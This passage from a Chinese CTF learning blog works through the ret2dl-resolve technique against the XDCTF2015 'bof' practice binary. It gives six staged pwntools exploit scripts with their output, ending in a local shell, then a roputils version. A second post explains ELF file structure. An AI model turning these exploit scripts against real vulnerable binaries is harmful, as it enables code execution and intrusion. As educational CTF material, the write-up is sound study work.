<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;bof&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;bof&#39;)</span><br><span class="line"></span><br><span class="line">read_plt&#x3D;elf.plt[&#39;read&#39;]</span><br><span class="line">write_plt&#x3D;elf.plt[&#39;write&#39;]</span><br><span class="line">ppp_ret&#x3D;0x08048619</span><br><span class="line">pop_ebp_ret&#x3D;0x0804861b</span><br><span class="line">leave_ret&#x3D;0x08048458</span><br><span class="line">stack_size&#x3D;0x800</span><br><span class="line">bss_addr&#x3D;0x0804a040</span><br><span class="line">base_stage&#x3D;bss_addr+stack_size</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Welcome to XDCTF2015~!\n&#39;)</span><br><span class="line"></span><br><span class="line">payload1&#x3D;&#39;a&#39;*112</span><br><span class="line">payload1+&#x3D;p32(read_plt)</span><br><span class="line">payload1+&#x3D;p32(ppp_ret)</span><br><span class="line">payload1+&#x3D;p32(0)</span><br><span class="line">payload1+&#x3D;p32(base_stage)</span><br><span class="line">payload1+&#x3D;p32(100)</span><br><span class="line">payload1+&#x3D;p32(pop_ebp_ret)</span><br><span class="line">payload1+&#x3D;p32(base_stage)</span><br><span class="line">payload1+&#x3D;p32(leave_ret)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">cmd&#x3D;&#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;AAAA&#39;</span><br><span class="line">payload2+&#x3D;p32(write_plt)</span><br><span class="line">payload2+&#x3D;&#39;AAAA&#39;</span><br><span class="line">payload2+&#x3D;p32(1)</span><br><span class="line">payload2+&#x3D;p32(base_stage+80)</span><br><span class="line">payload2+&#x3D;p32(len(cmd))</span><br><span class="line">payload2+&#x3D;&#39;A&#39;*(80-len(payload2))</span><br><span class="line">payload2+&#x3D;cmd+&#39;\x00&#39;</span><br><span class="line">payload2+&#x3D;&#39;A&#39;*(100-len(payload2))</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>我们打印出了cmd内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">L0ne1y@L0ne1y:~&#x2F;pwn&#x2F;Return-to-dl-resolve$ .&#x2F;stage1.py </span><br><span class="line">[+] Starting local process &#39;.&#x2F;bof&#39;: pid 21540</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;L0ne1y&#x2F;pwn&#x2F;Return-to-dl-resolve&#x2F;bof&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">&#x2F;bin&#x2F;sh[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>

<p><strong>stage2</strong><br>这次控制<code>eip</code>返回<code>PLT[0]</code>，要带上write的<code>index_offset(0X20)</code>。这里修改一下payload2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x80483d0  &lt;write@plt&gt;                 jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+28] &lt;0x804a01c&gt;</span><br><span class="line">0x80483d6  &lt;write@plt+6&gt;               push   0x20</span><br><span class="line">0x80483db  &lt;write@plt+11&gt;              jmp    0x8048380</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.....</span><br><span class="line">cmd&#x3D;&#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line">plt_0&#x3D;0x8048380</span><br><span class="line">index_offest&#x3D;0x20</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;AAAA&#39;</span><br><span class="line">payload2+&#x3D;p32(plt_0)</span><br><span class="line">payload2+&#x3D;p32(index_offest)</span><br><span class="line">payload2+&#x3D;&#39;AAAA&#39;</span><br><span class="line">payload2+&#x3D;p32(1)</span><br><span class="line">payload2+&#x3D;p32(base_stage+80)</span><br><span class="line">payload2+&#x3D;p32(len(cmd))</span><br><span class="line">payload2+&#x3D;&#39;A&#39;*(80-len(payload2))</span><br><span class="line">payload2+&#x3D;cmd+&#39;\x00&#39;</span><br><span class="line">payload2+&#x3D;&#39;A&#39;*(100-len(payload2))</span><br><span class="line">sh.sendline(payload2)</span><br></pre></td></tr></table></figure>

<p>同样会输出cmd内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">L0ne1y@L0ne1y:~&#x2F;pwn&#x2F;Return-to-dl-resolve$ .&#x2F;stage2.py </span><br><span class="line">[+] Starting local process &#39;.&#x2F;bof&#39;: pid 21781</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;L0ne1y&#x2F;pwn&#x2F;Return-to-dl-resolve&#x2F;bof&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">&#x2F;bin&#x2F;sh[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>

<p><strong>stage3</strong><br>这次控制<code>index_offset</code>，使其指向我们构造的<code>fake_reloc</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;通过参数reloc_arg计算重定位入口，这里的DT_JMPREL即.rel.plt, reloc_offset即reloc_arg</span><br><span class="line">const PLTREL *const reloc&#x3D; (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;通过reloc-&gt;r_info找到.dynsym中对应的条目。</span><br><span class="line">const ElfW(Sym) *sym &#x3D; &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br></pre></td></tr></table></figure>

<p>可以看到.rel.plt重定位表的地址是<code>0x08048330</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">节头：</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000a0 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          08048278 000278 00006b 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          080482e4 0002e4 000014 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         080482f8 0002f8 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             08048318 000318 000018 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             08048330 000330 000028 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        08048358 000358 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        08048380 000380 000060 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        080483e0 0003e0 000008 00  AX  0   0  8</span><br></pre></td></tr></table></figure>

<p>这里也可以看出。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">L0ne1y@L0ne1y:~&#x2F;pwn&#x2F;Return-to-dl-resolve$ objdump -s -j .rel.plt bof</span><br><span class="line"></span><br><span class="line">bof：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Contents of section .rel.plt:</span><br><span class="line"> 8048330 0ca00408 07010000 10a00408 07020000  ................</span><br><span class="line"> 8048340 14a00408 07040000 18a00408 07050000  ................</span><br><span class="line"> 8048350 1ca00408 07060000                    ........</span><br></pre></td></tr></table></figure>

<p>这里我们可以看到重定位表项的信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">重定位节 &#39;.rel.plt&#39; 位于偏移量 0x330 含有 5 个条目：</span><br><span class="line"> 偏移量     信息    类型              符号值      符号名称</span><br><span class="line">0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0</span><br><span class="line">0804a010  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0</span><br><span class="line">0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0</span><br><span class="line">0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0</span><br></pre></td></tr></table></figure>

<p>可以看出 write 的重定表项的 <code>r_offset=0x0804a01c</code>，<code>r_info=0x00000607</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">......</span><br><span class="line">cmd&#x3D;&#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line">plt_0&#x3D;0x8048380</span><br><span class="line">rel_plt_addr&#x3D;0x8048330</span><br><span class="line">index_offest&#x3D;(base_stage+28)-rel_plt_addr</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line">r_info &#x3D; 0x607</span><br><span class="line">fake_reloc&#x3D;p32(write_got)+p32(r_info)</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;AAAA&#39;</span><br><span class="line">payload2+&#x3D;p32(plt_0)</span><br><span class="line">payload2+&#x3D;p32(index_offest)</span><br><span class="line">payload2+&#x3D;&#39;AAAA&#39;</span><br><span class="line">payload2+&#x3D;p32(1)</span><br><span class="line">payload2+&#x3D;p32(base_stage+80)</span><br><span class="line">payload2+&#x3D;p32(len(cmd))</span><br><span class="line">payload2+&#x3D;fake_reloc</span><br><span class="line">payload2+&#x3D;&#39;A&#39;*(80-len(payload2))</span><br><span class="line">payload2+&#x3D;cmd+&#39;\x00&#39;</span><br><span class="line">payload2+&#x3D;&#39;A&#39;*(100-len(payload2))</span><br><span class="line">sh.sendline(payload2)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] Starting local process &#39;.&#x2F;bof&#39;: pid 23381</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;L0ne1y&#x2F;pwn&#x2F;Return-to-dl-resolve&#x2F;bof&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">&#x2F;bin&#x2F;sh[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>

<p><strong>stage4</strong><br>这一次构造<code>fake_sym</code>，使其指向我们控制的<code>st_name</code></p>
<p>首先，我们根据 write 的重定位表项的 r_info=0x607 可以知道，write 对应的符号在符号表的下标为 0x607&gt;&gt;8=0x6。因此，我们知道 write 对应的符号地址为 0x8048238。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">L0ne1y@L0ne1y:~&#x2F;pwn&#x2F;Return-to-dl-resolve$ objdump -s -EL -j  .dynsym bof</span><br><span class="line"></span><br><span class="line">bof：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Contents of section .dynsym:</span><br><span class="line"> 80481d8 00000000 00000000 00000000 00000000  ................</span><br><span class="line"> 80481e8 33000000 00000000 00000000 12000000  3...............</span><br><span class="line"> 80481f8 27000000 00000000 00000000 12000000  &#39;...............</span><br><span class="line"> 8048208 52000000 00000000 00000000 20000000  R........... ...</span><br><span class="line"> 8048218 20000000 00000000 00000000 12000000   ...............</span><br><span class="line"> 8048228 3a000000 00000000 00000000 12000000  :...............</span><br><span class="line"> 8048238 4c000000 00000000 00000000 12000000  L...............       &lt;---------</span><br><span class="line"> 8048248 2c000000 44a00408 04000000 11001a00  ,...D...........</span><br><span class="line"> 8048258 0b000000 3c860408 04000000 11001000  ....&lt;...........</span><br><span class="line"> 8048268 1a000000 40a00408 04000000 11001a00  ....@...........</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&#x3D;&#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line">plt_0&#x3D;0x8048380</span><br><span class="line">rel_plt_addr&#x3D;0x8048330</span><br><span class="line">index_offest&#x3D;(base_stage+28)-rel_plt_addr</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line"></span><br><span class="line">dynsym &#x3D; 0x080481d8</span><br><span class="line">dynstr &#x3D; 0x08048278</span><br><span class="line">fake_sym_addr &#x3D; base_stage + 36</span><br><span class="line">align &#x3D; 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)  对齐操作</span><br><span class="line">fake_sym_addr &#x3D; fake_sym_addr + align   </span><br><span class="line">index_dynsym &#x3D; (fake_sym_addr - dynsym) &#x2F; 0x10    计算write的index</span><br><span class="line">r_info &#x3D; (index_dynsym &lt;&lt; 8) | 0x7                计算偏移，有检查最后一位必须是7</span><br><span class="line">fake_reloc &#x3D; p32(write_got) + p32(r_info)</span><br><span class="line">st_name &#x3D; 0x4c</span><br><span class="line">fake_sym &#x3D; p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;AAAA&#39;</span><br><span class="line">payload2+&#x3D;p32(plt_0)</span><br><span class="line">payload2+&#x3D;p32(index_offest)</span><br><span class="line">payload2+&#x3D;&#39;AAAA&#39;</span><br><span class="line">payload2+&#x3D;p32(1)</span><br><span class="line">payload2+&#x3D;p32(base_stage+80)</span><br><span class="line">payload2+&#x3D;p32(len(cmd))</span><br><span class="line">payload2+&#x3D;fake_reloc</span><br><span class="line">payload2+&#x3D;&#39;B&#39;*align</span><br><span class="line">payload2+&#x3D;fake_sym</span><br><span class="line">payload2+&#x3D;&#39;A&#39;*(80-len(payload2))</span><br><span class="line">payload2+&#x3D;cmd+&#39;\x00&#39;</span><br><span class="line">payload2+&#x3D;&#39;A&#39;*(100-len(payload2))</span><br><span class="line">sh.sendline(payload2)</span><br></pre></td></tr></table></figure>

<p>同样会打印出cmd内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] Starting local process &#39;.&#x2F;bof&#39;: pid 25203</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;L0ne1y&#x2F;pwn&#x2F;Return-to-dl-resolve&#x2F;bof&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">&#x2F;bin&#x2F;sh[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>

<p><strong>stage5</strong><br>把<code>st_name</code>指向输入的字符串<code>&quot;write&quot;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&#x3D;&#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line">plt_0&#x3D;0x8048380</span><br><span class="line">rel_plt_addr&#x3D;0x8048330</span><br><span class="line">index_offest&#x3D;(base_stage+28)-rel_plt_addr</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line"></span><br><span class="line">dynsym &#x3D; 0x080481d8</span><br><span class="line">dynstr &#x3D; 0x08048278</span><br><span class="line">fake_sym_addr &#x3D; base_stage + 36</span><br><span class="line">align &#x3D; 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr &#x3D; fake_sym_addr + align</span><br><span class="line">index_dynsym &#x3D; (fake_sym_addr - dynsym) &#x2F; 0x10</span><br><span class="line">r_info &#x3D; (index_dynsym &lt;&lt; 8) | 0x7</span><br><span class="line">fake_reloc &#x3D; p32(write_got) + p32(r_info)</span><br><span class="line">st_name &#x3D; (fake_sym_addr + 0x10) - dynstr</span><br><span class="line">fake_sym &#x3D; p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line">sh.success(&#39;r_info : &#39; +hex(r_info))</span><br><span class="line">sh.success(&#39;align : &#39; +hex(align))</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;AAAA&#39;</span><br><span class="line">payload2+&#x3D;p32(plt_0)</span><br><span class="line">payload2+&#x3D;p32(index_offest)</span><br><span class="line">payload2+&#x3D;&#39;AAAA&#39;</span><br><span class="line">payload2+&#x3D;p32(1)</span><br><span class="line">payload2+&#x3D;p32(base_stage+80)</span><br><span class="line">payload2+&#x3D;p32(len(cmd))</span><br><span class="line">payload2+&#x3D;fake_reloc</span><br><span class="line">payload2+&#x3D;&#39;B&#39;*align</span><br><span class="line">payload2+&#x3D;fake_sym</span><br><span class="line">payload2+&#x3D;&#39;write\x00&#39;</span><br><span class="line">payload2+&#x3D;&#39;A&#39;*(80-len(payload2))</span><br><span class="line">payload2+&#x3D;cmd+&#39;\x00&#39;</span><br><span class="line">payload2+&#x3D;&#39;A&#39;*(100-len(payload2))</span><br><span class="line">sh.sendline(payload2)</span><br></pre></td></tr></table></figure>

<p>同样会打印出cmd内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] Starting local process &#39;.&#x2F;bof&#39;: pid 25366</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;L0ne1y&#x2F;pwn&#x2F;Return-to-dl-resolve&#x2F;bof&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[+] r_info : 0x26907</span><br><span class="line">[+] align : 0x4</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">&#x2F;bin&#x2F;sh[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>

<p><strong>stage6</strong><br>替换<code>write</code>为<code>system</code>，并修改<code>system</code>的参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&#x3D;&#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line">plt_0&#x3D;0x8048380</span><br><span class="line">rel_plt_addr&#x3D;0x8048330</span><br><span class="line">index_offest&#x3D;(base_stage+28)-rel_plt_addr</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line"></span><br><span class="line">dynsym &#x3D; 0x080481d8</span><br><span class="line">dynstr &#x3D; 0x08048278</span><br><span class="line">fake_sym_addr &#x3D; base_stage + 36</span><br><span class="line">align &#x3D; 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr &#x3D; fake_sym_addr + align</span><br><span class="line">index_dynsym &#x3D; (fake_sym_addr - dynsym) &#x2F; 0x10</span><br><span class="line">r_info &#x3D; (index_dynsym &lt;&lt; 8) | 0x7</span><br><span class="line">fake_reloc &#x3D; p32(write_got) + p32(r_info)</span><br><span class="line">st_name &#x3D; (fake_sym_addr + 0x10) - dynstr</span><br><span class="line">fake_sym &#x3D; p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line">sh.success(&#39;r_info : &#39; +hex(r_info))</span><br><span class="line">sh.success(&#39;align : &#39; +hex(align))</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;AAAA&#39;</span><br><span class="line">payload2+&#x3D;p32(plt_0)</span><br><span class="line">payload2+&#x3D;p32(index_offest)</span><br><span class="line">payload2+&#x3D;&#39;AAAA&#39;</span><br><span class="line">payload2+&#x3D;p32(base_stage+80)</span><br><span class="line">payload2+&#x3D;&#39;AAAA&#39;</span><br><span class="line">payload2+&#x3D;&#39;AAAA&#39;</span><br><span class="line">payload2+&#x3D;fake_reloc</span><br><span class="line">payload2+&#x3D;&#39;B&#39;*align</span><br><span class="line">payload2+&#x3D;fake_sym</span><br><span class="line">payload2+&#x3D;&#39;system\x00&#39;</span><br><span class="line">payload2+&#x3D;&#39;A&#39;*(80-len(payload2))</span><br><span class="line">payload2+&#x3D;cmd+&#39;\x00&#39;</span><br><span class="line">payload2+&#x3D;&#39;A&#39;*(100-len(payload2))</span><br><span class="line">sh.sendline(payload2)</span><br></pre></td></tr></table></figure>

<p>成功拿到shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">L0ne1y@L0ne1y:~&#x2F;pwn&#x2F;Return-to-dl-resolve$ .&#x2F;stage6.py </span><br><span class="line">[+] Starting local process &#39;.&#x2F;bof&#39;: pid 25428</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;L0ne1y&#x2F;pwn&#x2F;Return-to-dl-resolve&#x2F;bof&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[+] r_info : 0x26907</span><br><span class="line">[+] align : 0x4</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">bof    core      stage2.py  stage4.py    stage6.py</span><br><span class="line">bof.c  stage1.py  stage3.py  stage5.py</span><br></pre></td></tr></table></figure>

<h3 id="32位roputils库使用"><a href="#32位roputils库使用" class="headerlink" title="32位roputils库使用"></a>32位roputils库使用</h3><p>参见代码stage6_roputils.py</p>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">    #coding:utf-8</span><br><span class="line"></span><br><span class="line">    import roputils</span><br><span class="line">    from pwn import *</span><br><span class="line">    #只需确定文件名+溢出偏移。roputils.py文件要放到同一目录下</span><br><span class="line">    fpath &#x3D; &#39;.&#x2F;bof&#39;</span><br><span class="line">    offset &#x3D; 112</span><br><span class="line"></span><br><span class="line">    rop &#x3D; roputils.ROP(fpath)</span><br><span class="line">    addr_bss &#x3D; rop.section(&#39;.bss&#39;)</span><br><span class="line"></span><br><span class="line">    buf &#x3D; rop.retfill(offset)</span><br><span class="line">    buf +&#x3D; rop.call(&#39;read&#39;, 0, addr_bss, 100)</span><br><span class="line">    buf +&#x3D; rop.dl_resolve_call(addr_bss+20, addr_bss)</span><br><span class="line"></span><br><span class="line">    p&#x3D;process(fpath)</span><br><span class="line">    print p.recv()</span><br><span class="line">    p.send(p32(len(buf)) + buf)</span><br><span class="line"></span><br><span class="line">    buf &#x3D; rop.string(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">    buf +&#x3D; rop.fill(20, buf)</span><br><span class="line">    buf +&#x3D; rop.dl_resolve_data(addr_bss+20, &#39;system&#39;)</span><br><span class="line">    buf +&#x3D; rop.fill(100, buf)</span><br><span class="line"></span><br><span class="line">    p.send(buf)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#_4" target="_blank" rel="noopener external nofollow noreferrer">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#_4</a></p>
<p><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener external nofollow noreferrer">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></p>
<p><a href="https://d0m021ng.github.io/2016/11/03/PWN/ret2-dl-resolve-payload-%E6%9E%84%E9%80%A0%E5%8E%9F%E7%90%86%EF%BC%88%E4%BA%8C%EF%BC%89/" target="_blank" rel="noopener external nofollow noreferrer">https://d0m021ng.github.io/2016/11/03/PWN/ret2-dl-resolve-payload-%E6%9E%84%E9%80%A0%E5%8E%9F%E7%90%86%EF%BC%88%E4%BA%8C%EF%BC%89/</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>ret2_dl_runtime_resolve</category>
      </categories>
      <tags>
        <tag>ret2_dl_runtime_resolve</tag>
      </tags>
  </entry>
  <entry>
    <title>ELF文件基本结构</title>
    <url>/2020/11/01/ELF%E6%96%87%E4%BB%B6%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/11/01/8pRPsV4Yji13CNu.jpg" alt="5f8e8b8e50326.jpg"></p>
<a id="more"></a>

<h1 id="ret2-dl-runtime-resolve学习第一步"><a href="#ret2-dl-runtime-resolve学习第一步" class="headerlink" title="ret2_dl_runtime_resolve学习第一步"></a>ret2_dl_runtime_resolve学习第一步</h1><h2 id="ELF文件结构"><a href="#ELF文件结构" class="headerlink" title="ELF文件结构"></a>ELF文件结构</h2><p>之前学习<code>ret2_dl_runtime_resolve</code>看了ELF文件后，看的稀里糊涂，然后就被劝退了，现在做题碰到题不会写，现在被迫学，呜呜呜~~</p>
<p>WIKI上直接讲的利用方法，在学之前需要学习ELF文件基本结构和动态链接过程，我这里就记录一下自己的学习过程。</p>
<p><img src="https://i.loli.net/2020/11/01/F57JVjg19AIkLZx.png" alt="image-20201029212859066.png"></p>
<p><strong>注意：段（<code>Segment</code>）与节（<code>Section</code>）的区别。很多地方对两者有所混淆。段是程序执行的必要组成，当多个目标文件链接成一个可执行文件时，会将相同权限的节合并到一个段中(像.data节和.bss节就被整合到了一起)。相比而言，节的粒度更小。Segment是告诉操作系统应该将段加载虚拟内存的那个位置</strong></p>
<p>如图所示，为ELF文件的基本结构，其主要由四部分组成：</p>
<ul>
<li>ELF Header</li>
<li>ELF Program Header Table (或称Program Headers、程序头)</li>
<li>ELF Section Header Table (或称Section Headers、节头表)</li>
<li>ELF Sections</li>
</ul>
<p>从图中，我们就能看出它们各自的数据结构以及相互之间的索引关系。下面我们依次进行介绍。</p>
<h3 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">L0ne1y@L0ne1y:~&#x2F;pwn&#x2F;ROP&#x2F;ret2libc3$ readelf -h ret2libc3</span><br><span class="line">ELF 头：</span><br><span class="line">  Magic：   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  类别:                              ELF32</span><br><span class="line">  数据:                              2 补码，小端序 (little endian)</span><br><span class="line">  版本:                              1 (current)</span><br><span class="line">  OS&#x2F;ABI:                            UNIX - System V</span><br><span class="line">  ABI 版本:                          0</span><br><span class="line">  类型:                              EXEC (可执行文件)</span><br><span class="line">  系统架构:                          Intel 80386</span><br><span class="line">  版本:                              0x1</span><br><span class="line">  入口点地址：               0x80484d0</span><br><span class="line">  程序头起点：          52 (bytes into file)</span><br><span class="line">  Start of section headers:          6436 (bytes into file)</span><br><span class="line">  标志：             0x0</span><br><span class="line">  本头的大小：       52 (字节)     &#x2F;&#x2F;Size of this header</span><br><span class="line">  程序头大小：       32 (字节)     &#x2F;&#x2F;Size of program headers</span><br><span class="line">  Number of program headers:         9 &#x2F;&#x2F;程序头数量</span><br><span class="line">  节头大小：         40 (字节)     &#x2F;&#x2F;单个节头大小</span><br><span class="line">  节头数量：         35</span><br><span class="line">  字符串表索引节头： 32         	  &#x2F;&#x2F;Section Header字符串表在Section Header Table中的索引</span><br></pre></td></tr></table></figure>

<p>这里着重说几个ELF Header的成员的含义。</p>
<h4 id="ELF魔数"><a href="#ELF魔数" class="headerlink" title="ELF魔数"></a>ELF魔数</h4><p>一般可执行文件的开头的前四个字节，被称做魔数(Magic Number)，像ELF可执行文件的前四个字节是<code>7f 45 4c 46</code>也就是<code>0x7f，e，l，f</code>。</p>
<h4 id="程序入口点"><a href="#程序入口点" class="headerlink" title="程序入口点"></a>程序入口点</h4><p>入口地址，规定ELF程序的入口虚拟地址，操作系统在加载完该程序后从这个地址开始执行进程的指令。可重定位指令一般没有入口地址，则该值为0</p>
<h4 id="ELF文件类型"><a href="#ELF文件类型" class="headerlink" title="ELF文件类型"></a>ELF文件类型</h4><p>ELF文件主要有三种类型，可以通过ELF Header中的<code>e_type</code>成员进行区分。</p>
<ul>
<li>可重定位文件（Relocatable File)：<code>ETL_REL</code>。一般为<code>.o</code>文件。可以被链接成可执行文件或共享目标文件。静态链接库属于可重定位文件。</li>
<li>可执行文件（Executable File)：<code>ET_EXEC</code>。可以直接执行的程序。</li>
<li>共享目标文件（Shared Object File）：ET_DYN。一般为.so文件。有两种情况可以使用。<ul>
<li>链接器将其与其他可重定位文件、共享目标文件链接成新的目标文件；</li>
<li>动态链接器将其与其他共享目标文件、结合一个可执行文件，创建进程映像</li>
</ul>
</li>
</ul>
<h3 id="ELF-Program-Header-Table"><a href="#ELF-Program-Header-Table" class="headerlink" title="ELF Program Header Table"></a>ELF Program Header Table</h3><p>program header用于描述segment的特性，重定位文件(.o)没有program header 因为它不可以运行。ELF可执行文件是由Program Header Table的。</p>
